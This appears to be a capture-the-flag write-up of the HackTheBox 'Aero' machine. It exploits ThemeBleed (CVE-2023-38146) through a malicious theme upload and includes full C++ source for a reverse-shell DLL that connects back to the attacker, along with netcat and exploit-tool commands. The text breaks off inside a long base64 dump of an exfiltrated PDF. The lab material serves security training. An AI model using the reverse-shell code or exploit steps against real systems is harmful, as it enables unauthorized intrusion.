HTB: Aero
=========

![Aero](https://0xdf.gitlab.io/img/aero-cover.png)

The Aero box is a non-competitive release from HackTheBox meant to showcase two hot CVEs right now, ThemeBleed (CVE-2023-38146) and a Windows kernel exploit being used by the Nokoyawa ransomware group (CVE-2023-28252). To exploit these, I’ll have to build a reverse shell DLL other steps in Visual Studio. In Beyond Root, I’ll look at a neat automation technique I hadn’t seen before using FileSystemWatcher to run an action on file creation.

## Box Info

Name[Aero](https://www.hackthebox.com/machines/aero) [![Aero](https://0xdf.gitlab.io/icons/box-aero.png)](https://www.hackthebox.com/machines/aero)

[Play on HackTheBox](https://www.hackthebox.com/machines/aero)Release Date28 Sep 2023Retire Date28 Sep 2023OSWindows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)Base PointsMedium \[30\]![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)N/A (non-competitive)![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)N/A (non-competitive)Creator[![ctrlzero](https://www.hackthebox.eu/badge/image/168546)](https://app.hackthebox.com/users/168546)

## Recon

### nmap

`nmap` finds one open TCP port, HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.237
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-26 22:58 EDT
Nmap scan report for 10.10.11.237
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.54 seconds
oxdf@hacky$ nmap -p 80 -sCV 10.10.11.237
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-26 22:58 EDT
Nmap scan report for 10.10.11.237
Host is up (0.091s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Aero Theme Hub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.34 seconds

```

Based on the [IIS version](https://en.wikipedia.org/wiki/Internet_Information_Services#Versions), the host is likely running an modern Windows OS (Window 10/11 or Server 2016+).

### Website - TCP 80

#### Site

The website is a repository for Windows 11 themes:

![image-20230926081003612](https://0xdf.gitlab.io/img/image-20230926081003612.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Towards the bottom there’s a form to upload custom themes:

![image-20230926081129731](https://0xdf.gitlab.io/img/image-20230926081129731.png)

The “Browse” button opens a file dialog for `.theme` and `.themepack` extensions. If I try to upload an image, it reject it based on file extension (or so it says):

![image-20230926084611408](https://0xdf.gitlab.io/img/image-20230926084611408.png)

I’ll make a dummy file, `test.theme`, and upload it, and it takes:

![image-20230926084529399](https://0xdf.gitlab.io/img/image-20230926084529399.png)

It doesn’t seem to be checking the file beyond extension. The site also says that it will test the theme, which implies that someone will open it.

At the bottom, there’s an email, `support@aerohub.htb`. All the links on the page go to other parts of the same page.

#### Tech Stack

The HTTP response headers show IIS version 10:

```
HTTP/1.1 200 OK
Cache-Control: no-cache, no-store
Pragma: no-cache
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
Set-Cookie: .AspNetCore.Antiforgery.SV5HtsIgkxc=CfDJ8KhwwGdRThZIsdKv2UEKBTSKcK6NYPd906TegwfWvC5IvpQ6t9cvvVGbGBjIdz6FTU-kOje59n9YpR8Q0CZtkfoJtfs2njXhJ_fDAJGYcVimZ-11D2WAdnNEB1nTRyfLh3gTNQxTVeUrG5h-tdWSJ8c; path=/; samesite=strict; httponly
X-Frame-Options: SAMEORIGIN
X-Powered-By: ARR/3.0
Date: Tue, 26 Sep 2023 12:09:15 GMT
Connection: close
Content-Length: 11650

```

The `X-Powered-By` of `ARR/3.0` is different from what is more commonly `ASP.NET`. [Application Request Routing](https://en.wikipedia.org/wiki/Application_Request_Routing) is an IIS extension to handle load balancing.

I’m not able to guess an extension for the index page, and the 404 page is just blank.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, giving it a lowercase wordlist as IIS is case-insensitive:

```
oxdf@hacky$ feroxbuster -u http://10.10.11.237 -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.237
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      186l      870w    11650c http://10.10.11.237/
200      GET      186l      870w    11650c http://10.10.11.237/home
400      GET        6l       26w      324c http://10.10.11.237/error%1F_log
[####################] - 1m     26584/26584   0s      found:3       errors:0
[####################] - 1m     26584/26584   366/s   http://10.10.11.237/

```

It finds `/home`, which loads as the main page.

## Shell as sam.emerson

### ThemeBleed

#### Identify

Searching for “windows 11 theme exploit” returns lots of results for something called “ThemeBleed”:

![image-20230926082127878](https://0xdf.gitlab.io/img/image-20230926082127878.png)

#### Background

CVE-2023-38146, known as ThemeBleed, is a vulnerability in Windows Themes that allows for remote code execution. It was patched in the [September 2023 Patch Tuesday](https://www.bleepingcomputer.com/news/microsoft/microsoft-september-2023-patch-tuesday-fixes-2-zero-days-59-flaws/).

The vulnerability comes from how Windows handles the `.msstyles` files referenced from within the theme file. These `.msstyles` files lead to Windows opening a DLL at the same path as the `.msstyles` path with `_vrf.dll` appended. The digital signature on this file is checked before it is loaded.

The vulnerability comes because, when version 999 is used, there’s a big gap between the time when the `_vrf.dll` binary’s signature is checked and when it is loaded for use. This gaps presents a race condition, where the attacker can replace the verified style DLL with a malicious payload to run arbitrary code.

#### POC

The proof of concept code released by the researcher is in [this GitHub repo](https://github.com/gabe-k/themebleed). In the [Releases](https://github.com/gabe-k/themebleed/releases/tag/v1) section there’s a zip file that contains a Windows executable as well as DLLs named `stage1`, `stage2`, and `stage3`:

```
oxdf@hacky$ find . -type f -exec file {} \;
./SMBLibrary.Win32.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
./ThemeBleed.pdb: MSVC program database ver 7.00, 512*95 bytes
./ThemeBleed.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
./SMBLibrary.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
./data/stage_3: PE32+ executable (DLL) (console) x86-64, for MS Windows
./data/stage_1: PE32+ executable (DLL) (console) x86-64, for MS Windows
./data/stage_2: PE32+ executable (DLL) (console) x86-64, for MS Windows

```

The README on GitHub shows the exe has three commands:

- `server` \- run the server
- `make_theme` \- make a `.theme` file
- `make_themepack` \- make a `.themepack` file

`stage1` is a `msstyles` file with the `PACHTHEME_VERSION` set to 999. `stage2` is a legit signed styles file to pass the check. `stage3` is the DLL to be loaded, which by default will launch `calc.exe`.

#### Code Analysis

The README is a bit thin on what the exploit is actually doing. I want to take a look at the actual code before running it, to understand what it’s doing both so I can make it work and to make sure it’s not doing anything nefarious on my machine. I’ll walk through this analysis in [this video](https://www.youtube.com/watch?v=CdzgD-eMOnY):

The big take-aways are:

- The Theme tries to load the style file from a SMB share on my host.
- That triggers interaction with a file ending in `_vrf.dll`, first opening it with the `CreateFile` API to read it and verify it’s signature, and then opening it with the `LoadLibrary` API.
- The SMB server uses the differences in how it’s opened to return either the legit DLL or the malicious one.

### Generate DLL

#### Set Up VS Project

I’ve got a reverse shell DLL in my [CTF Scripts repo](https://gitlab.com/0xdf/ctfscripts/-/tree/master/rev_shell_dll?ref_type=heads) that I used for the [Helpline HTB box](https://0xdf.gitlab.io/2019/08/17/htb-helpline-win.html#payload). It won’t work here because it pulls from the local environment variables to get the callback IP and port. It also run the reverse shell on DLL load, where as the instructions for the POC say to use the `VerifyThemeVersion` function.

I’ll open Visual Studio (not Visual Studio Code) and “Create a new project”. I’ll use “C++”, “Windows”, and “Library” from the filter menu, to get to “Dynamic-Link Library (DLL)”:

![image-20230926102531429](https://0xdf.gitlab.io/img/image-20230926102531429.png)

I’ll name the project and get a folder for it:

![image-20230926123358322](https://0xdf.gitlab.io/img/image-20230926123358322.png)

#### Create Dummy DLL With Exports

Before I try to put a reverse shell in, I want to make sure I can create a DLL with the correct export name. The project starts with `dllmain.cpp` in the “Source Files” directory:

![image-20230926123703993](https://0xdf.gitlab.io/img/image-20230926123703993.png)

That code has the `DllMain` function defined. In the past, I’ve called my reverse shell from here where the template has a `break`:

![image-20230926123753275](https://0xdf.gitlab.io/img/image-20230926123753275.png)

I’ll create a new header file by right clicking on “Header Files” in the Solution Explorer and name it `rev.h`. In this file, I’ll define the exported function:

```
#pragma once

extern "C" __declspec(dllexport) int VerifyThemeVersion(void);

```

In C++, it’s important to have `"C"` or else the function name will be mangled when it exports.

I’ll add `rev.cpp` to “Source Files” in the Solutions Explorer, and in it, add the code to pop a message box:

```
#include "pch.h"
#include <Windows.h>
#include "rev.h"

using namespace std;

int VerifyThemeVersion(void)
{
    MessageBox(NULL, L"Hello, World!", L"Test", MB_OK);
    return 0;
}

```

It’s important to include `rev.h` to get the function header and export working correctly.

I’ll set my project to Release, and go Build > Build Solution, and it builds. I can look at it in something like CFF explorer and see the export:

![image-20230926124753014](https://0xdf.gitlab.io/img/image-20230926124753014.png)

Running it with `rundll32` will show it works:

![image-20230926124826895](https://0xdf.gitlab.io/img/image-20230926124826895.png)

#### Add Reverse Shell

I’ll grab a reverse shell from an online repo (I’ll use [mine](https://gitlab.com/0xdf/ctfscripts/-/blob/master/rev_shell_dll/rev_shell_dll/rev_shell_dll.cpp?ref_type=heads), but there are lots), and tweak it to get what I need. Mine reads the callback IP and port from the environment, which won’t work here. I’ll define those as constants at the top of the function:

```
#include "pch.h"
#include <stdio.h>
#include <string.h>
#include <process.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#pragma comment(lib, "Ws2_32.lib")
#include "rev.h"
using namespace std;

void rev_shell()
{
	FreeConsole();

	const char* REMOTE_ADDR = "127.0.0.1";
	const char* REMOTE_PORT = "4444";

	WSADATA wsaData;
	int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	struct addrinfo* result = NULL, * ptr = NULL, hints;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	getaddrinfo(REMOTE_ADDR, REMOTE_PORT, &hints, &result);
	ptr = result;
	SOCKET ConnectSocket = WSASocket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, NULL, NULL);
	connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdInput = (HANDLE)ConnectSocket;
	si.hStdOutput = (HANDLE)ConnectSocket;
	si.hStdError = (HANDLE)ConnectSocket;
	TCHAR cmd[] = TEXT("C:\\WINDOWS\\SYSTEM32\\CMD.EXE");
	CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	WSACleanup();
}

int VerifyThemeVersion(void)
{
	rev_shell();
	return 0;
}

```

When I run this again using `rundll32`, there’s a connection at `nc.exe` on the same box:

```
PS > nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 9836
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

FLARE Tue 09/26/2023 12:53:16.43
C:\Users\0xdf>

```

I’ll update the IP from `127.0.0.1` to my `tun0` IP and rebuild.

### Create Theme

I’ll copy the DLL payload into the ThemeBleed repo over `data/stage3`:

```
PS > copy ..\rev_shell_dll\ReverseShellDLL\x64\Release\ReverseShellDLL.dll .\data\stage_3

```

Now I’ll generate a theme file:

```
PS > .\ThemeBleed.exe make_theme 10.10.14.6 exploit.theme

```

### Stand Up Server

#### SMB Collision

If I try to start the server now, it fails:

```
PS > .\ThemeBleed.exe server

Unhandled Exception: System.Net.Sockets.SocketException: An attempt was made to access a socket in a way forbidden by its access permissions
   at System.Net.Sockets.Socket.DoBind(EndPoint endPointSnapshot, SocketAddress socketAddress)
   at System.Net.Sockets.Socket.Bind(EndPoint localEP)
   at SMBLibrary.Server.SMBServer.Start(IPAddress serverAddress, SMBTransportType transport, Int32 port, Boolean enableSMB1, Boolean enableSMB2, Boolean enableSMB3, Nullable`1 connectionInactivityTimeout)
   at SMBLibrary.Server.SMBServer.Start(IPAddress serverAddress, SMBTransportType transport, Boolean enableSMB1, Boolean enableSMB2)
   at SMBFilterDemo.Program.RunServer() in C:\Users\U\source\repos\SMBFilterDemo\SMBFilterDemo\Program.cs:line 63
   at SMBFilterDemo.Program.Main(String[] args) in C:\Users\U\source\repos\SMBFilterDemo\SMBFilterDemo\Program.cs:line 129

```

The problem is that Windows is already listening on SMB by default.

#### Turn Off SMB

The easiest way I know of to completely disable SMB is to disable the Server service in the Windows Service panel:

![image-20230926133614570](https://0xdf.gitlab.io/img/image-20230926133614570.png)

Stopping the service should work, but something continues to hold port 445, at least on my machine. Rebooting here solves that.

#### Run Server

After the reboot, I’m able to run the exploit in Server mode:

```
PS > .\ThemeBleed.exe server
Server started

```

### Shell

I’ll start `nc` listening on my Windows host, connect to the HTB VPN, and upload the theme file. Almost immediately there are connections at the ThemeBleed server:

```
PS > .\ThemeBleed.exe server
Server started
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary

```

Then it hangs, and there’s a connection at `nc`:

```
PS > nc -lvnp 4444
listening on [any] 4444 ...
Connection received on 10.10.11.237 51506
Microsoft Windows [Version 10.0.22000.1761]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
aero\sam.emerson

C:\Windows\system32>

```

The shell is as sam.emerson, and I’m able to read `user.txt`:

```
C:\Users\sam.emerson\Desktop> type user.txt
f3597b4c************************

```

**Potential Bug**: It is possible that sometimes the shell that comes back looks like this, with the directory of `ImmersiveControlPanel`:

```
PS > nc -lvnp 4444
listening on [any] 4444 ...
Connection received on 10.10.11.237 50272
Microsoft Windows [Version 10.0.22000.1761]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\ImmersiveControlPanel>

```

In this shell, PowerShell won’t start:

```
C:\Windows\ImmersiveControlPanel> powershell
Starting the CLR failed with HRESULT 8013104a.

C:\Windows\ImmersiveControlPanel>

```

Other executables won’t run either. This seems to happen when Control Panel is still open on the box from a previous exploit. If this shell comes back, kill it and try again, reverting the machine if necessary.

## Shell as root

### Enumeration

#### Documents

In sam.emerson’s `Documents` directory there’s a PDF document:

```
C:\Users\sam.emerson\Documents> dir
 Volume in drive C has no label.
 Volume Serial Number is C009-0DB2

 Directory of C:\Users\sam.emerson\Documents

09/21/2023  02:58 PM    <DIR>          .
09/20/2023  05:08 AM    <DIR>          ..
09/21/2023  09:18 AM            14,158 CVE-2023-28252_Summary.pdf
09/20/2023  07:10 AM               987 watchdog.ps1
               2 File(s)         15,145 bytes
               2 Dir(s)   3,048,124,416 bytes free

```

`watchdog.ps1` is the script that emulates sam.emerson’s loading the themes.

I’ll exfil the PDF by converting it to base64:

```
PS C:\Users\sam.emerson\Desktop> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\sam.emerson\Desktop> cd ..\Documents
PS C:\Users\sam.emerson\documents> ls

    Directory: C:\Users\sam.emerson\documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         9/21/2023   9:18 AM          14158 CVE-2023-28252_Summary.pdf
-a----         9/26/2023   1:07 PM            987 watchdog.ps1

PS C:\Users\sam.emerson\documents> [convert]::ToBase64String((Get-Content -path "CVE-2023-28252_Summary.pdf" -Encoding byte))
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